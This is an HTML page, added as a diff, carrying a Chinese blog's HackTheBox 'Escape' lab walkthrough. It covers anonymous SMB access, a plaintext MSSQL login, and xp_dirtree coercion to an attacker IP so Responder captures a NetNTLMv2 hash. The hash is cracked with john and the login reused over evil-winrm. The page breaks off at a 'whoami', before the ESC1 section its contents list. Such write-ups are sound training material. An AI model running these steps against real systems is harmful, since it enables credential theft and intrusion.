@@ -1,0 +1,1129 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  HTB Escape | Ya1orin
+</title>
+<meta name="description" content="HackTheBox篇ADCS系列之Escape"/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"LanguageName\":\"English\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false},{\"Lang\":\"zh-cn\",\"LanguageName\":\"简体中文\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="HTB Escape | Ya1orin" />
+  <meta
+    property="og:description"
+    content="HackTheBox篇ADCS系列之Escape"
+  />
+  <meta property="og:url" content="http://localhost:1313/post/htb-escape/" />
+  <meta
+    property="og:site_name"
+    content="Ya1orin"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Ya1orin" />
+  <meta property="article:published_time" content="2025-03-19T19:24:19&#43;08:00" />
+  <meta property="article:modified_time" content="2025-11-11T15:04:11&#43;08:00" /><meta property="article:tag" content="WindowsADCS-ESC1MSSQL" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css"
+    integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr/Io" crossorigin="anonymous"/><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" arial-selected="false" >English</li><li data-value="zh-cn" role="option" class="selected" arial-selected="true" >简体中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="HTB Escape"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">HTB Escape</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          class="sidebar-left"
+            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a></li>
+    <li><a href="#smb信息收集">SMB信息收集</a></li>
+    <li><a href="#mssql攻击">MSSQL攻击</a></li>
+    <li><a href="#后渗透">后渗透</a></li>
+    <li><a href="#esc1提权">ESC1提权</a></li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-03-19 19:24:19 &#43;0800 CST" itemprop="datePublished"
+      >2025-03-19</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-11-11</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/hackthebox"
+      data-aos="zoom-in"
+      >HACKTHEBOX</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><blockquote>
+<p>靶机ip：10.10.11.202</p>
+</blockquote>
+<h1 id="知识点">
+<a class="header-anchor" href="#%e7%9f%a5%e8%af%86%e7%82%b9"></a>
+知识点
+</h1><ul>
+<li>mssql 利用 xp_dirtree 获取 NetNTLM hash</li>
+<li>ADCS枚举</li>
+<li>ADCS ESC1提权</li>
+</ul>
+<h1 id="信息收集">
+<a class="header-anchor" href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+信息收集
+</h1><p>使用<code>rustscan</code> 扫描端口</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./rustscan -a 10.10.11.202 -u <span class="m">5000</span>
+</span></span><span class="line"><span class="cl">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="o">{}</span>  <span class="o">}</span><span class="p">|</span> <span class="o">{</span> <span class="o">}</span> <span class="p">|</span><span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span><span class="p">|</span>  <span class="sb">`</span><span class="p">|</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> <span class="p">|</span>.-._<span class="o">}</span> <span class="o">}</span> <span class="p">|</span> <span class="p">|</span>  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> <span class="p">|</span><span class="se">\ </span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="sb">`</span>-<span class="s1">&#39; `-&#39;</span><span class="sb">`</span>-----<span class="s1">&#39;`----&#39;</span>  <span class="sb">`</span>-<span class="s1">&#39;  `----&#39;</span>  <span class="sb">`</span>---<span class="s1">&#39; `-&#39;</span>  <span class="sb">`</span>-<span class="s1">&#39;`-&#39;</span> <span class="sb">`</span>-<span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">The Modern Day Port Scanner.
+</span></span><span class="line"><span class="cl">________________________________________
+</span></span><span class="line"><span class="cl">: http://discord.skerritt.blog         :
+</span></span><span class="line"><span class="cl">: https://github.com/RustScan/RustScan :
+</span></span><span class="line"><span class="cl"> --------------------------------------
+</span></span><span class="line"><span class="cl">0day was here ♥
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>~<span class="o">]</span> The config file is expected to be at <span class="s2">&#34;/root/.rustscan.toml&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>~<span class="o">]</span> Automatically increasing <span class="nb">ulimit</span> value to 5000.
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:53
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:88
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:135
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:139
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:389
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:445
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:464
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:593
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:636
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:1433
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:3269
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:3268
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:5985
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:9389
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:49667
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:49689
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:49690
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:49712
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:49724
+</span></span><span class="line"><span class="cl">Open 10.10.11.202:49727
+</span></span></code></pre></div><h1 id="smb信息收集">
+<a class="header-anchor" href="#smb%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+SMB信息收集
+</h1><p>使用<code>smbclient</code>尝试匿名访问</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">smbclient -L //10.10.11.202
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\r</span>oot<span class="o">]</span>:                                                         Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">        ---------       ----      -------
+</span></span><span class="line"><span class="cl">        ADMIN$          Disk      Remote Admin
+</span></span><span class="line"><span class="cl">        C$              Disk      Default share
+</span></span><span class="line"><span class="cl">        IPC$            IPC       Remote IPC
+</span></span><span class="line"><span class="cl">        NETLOGON        Disk      Logon server share
+</span></span><span class="line"><span class="cl">        Public          Disk
+</span></span><span class="line"><span class="cl">        SYSVOL          Disk      Logon server share
+</span></span></code></pre></div><p>发现可以匿名访问</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">smbclient //10.10.11.202/Public
+</span></span><span class="line"><span class="cl">Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\r</span>oot<span class="o">]</span>:
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
+</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Sat Nov <span class="m">19</span> 19:51:25 <span class="m">2022</span>
+</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Sat Nov <span class="m">19</span> 19:51:25 <span class="m">2022</span>
+</span></span><span class="line"><span class="cl">  SQL Server Procedures.pdf           A    <span class="m">49551</span>  Fri Nov <span class="m">18</span> 21:39:43 <span class="m">2022</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="m">5184255</span> blocks of size 4096. <span class="m">1449739</span> blocks available
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span>
+</span></span></code></pre></div><p>发现<code>SQL Server Procedures.pdf</code>文件，下载下来</p>
+<p>在文件的最后可以找到一组<code>mssql</code>数据库用户名密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250319200605684-840021635.png" alt="image-20250319200603832"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username: PublicUser
+</span></span><span class="line"><span class="cl">password: GuestUserCantWrite1
+</span></span></code></pre></div><h1 id="mssql攻击">
+<a class="header-anchor" href="#mssql%e6%94%bb%e5%87%bb"></a>
+MSSQL攻击
+</h1><p>有一组用户名密码，拿<code>impacket-mssqlclient</code>工具连接</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.10.11.202
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Encryption required, switching to TLS
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: <span class="m">16192</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>: Line 1: Changed database context to <span class="s1">&#39;master&#39;</span>.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>: Line 1: Changed language setting to us_english.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="o">(</span><span class="m">150</span> 7208<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>PublicUser  guest@master<span class="o">)</span>&gt;
+</span></span></code></pre></div><p>尝试使用<code>xp_cmdshell</code>执行命令</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-zed" data-lang="zed"><span class="line"><span class="cl"><span class="n">SQL</span><span class="w"> </span><span class="p">(</span><span class="n">PublicUser</span><span class="w">  </span><span class="n">guest</span><span class="err">@</span><span class="n">master</span><span class="p">)</span><span class="o">&gt;</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="n">whoami</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="p">(</span><span class="n">DC</span><span class="err">\</span><span class="n">SQLMOCK</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="n">Line</span><span class="w"> </span><span class="err">1</span><span class="o">:</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">EXECUTE</span><span class="w"> </span><span class="kd">permission</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">denied</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">object</span><span class="w"> </span><span class="err">&#39;</span><span class="n">xp_cmdshell</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="err">&#39;</span><span class="n">mssqlsystemresource</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">schema</span><span class="w"> </span><span class="err">&#39;</span><span class="n">sys</span><span class="err">&#39;</span><span class="p">.</span><span class="w">
+</span></span></span></code></pre></div><p>很明显执行不了命令，尝试让 MSSQL 服务通过 <code>xp_dirtree</code> 向攻击机发起请求。并且通过 <code>Responder</code> 建立监听尝试捕获一些信息。</p>
+<p>先建立监听：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">responder -I tun0 -v
+</span></span></code></pre></div><p>MSSQL发送请求：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SQL (PublicUser  guest@master)&gt; xp_dirtree \\10.10.16.13\test
+</span></span><span class="line"><span class="cl">subdirectory   depth   file
+</span></span><span class="line"><span class="cl">------------   -----   ----
+</span></span></code></pre></div><p><code>responder</code>监听的网卡会收到<code>sql_svc</code>的hash</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 10.10.11.202
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : sequel<span class="se">\s</span>ql_svc
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : sql_svc::sequel:8612e788cb8bddf3:C6DA92175B23FD264635674CCD6EC5B2:010100000000000080925D370F99DB0178D8B8E92A6BD9F10000000002000800560038005700360001001E00570049004E002D004E00460048005300580055004E00360041004B00410004003400570049004E002D004E00460048005300580055004E00360041004B0041002E0056003800570036002E004C004F00430041004C000300140056003800570036002E004C004F00430041004C000500140056003800570036002E004C004F00430041004C000700080080925D370F99DB010600040002000000080030003000000000000000000000000030000038ECC847950C3FD11DDB45E0CEA201C6177644C6ECA7744DC5CF94943B059BE70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310033000000000000000000
+</span></span></code></pre></div><p>将上述hash保存至文件hash中，使用<code>john</code>工具尝试破解</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">john <span class="nb">hash</span> --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Will run <span class="m">2</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">REGGIE1234ronnie <span class="o">(</span>sql_svc<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:17 DONE <span class="o">(</span>2025-03-19 20:46<span class="o">)</span> 0.05656g/s 605248p/s 605248c/s 605248C/s REINLY..REDMAN69
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></div><p>得到一组新的用户名密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username: sql_svc
+</span></span><span class="line"><span class="cl">password: REGGIE1234ronnie
+</span></span></code></pre></div><p>已知一组用户名密码，端口开放5985，使用<code>netexec </code>验证一下能否通过<code>evil-winrm</code>工具登录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">netexec  winrm 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.202    <span class="m">5985</span>   DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:sequel.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.202    <span class="m">5985</span>   DC               <span class="o">[</span>+<span class="o">]</span> sequel.htb<span class="se">\s</span>ql_svc:REGGIE1234ronnie <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span></span></code></pre></div><h1 id="后渗透">
+<a class="header-anchor" href="#%e5%90%8e%e6%b8%97%e9%80%8f"></a>
+后渗透
+</h1><p>发现可以登录，使用<code>evil-winrm</code>登录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="sb">`</span>quoting_detection_proc<span class="err">&#39;</span> <span class="k">for</span> module Reline
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>ocuments&gt; whoami
+</span></span><span class="line"><span class="cl">sequel<span class="se">\s</span>ql_svc
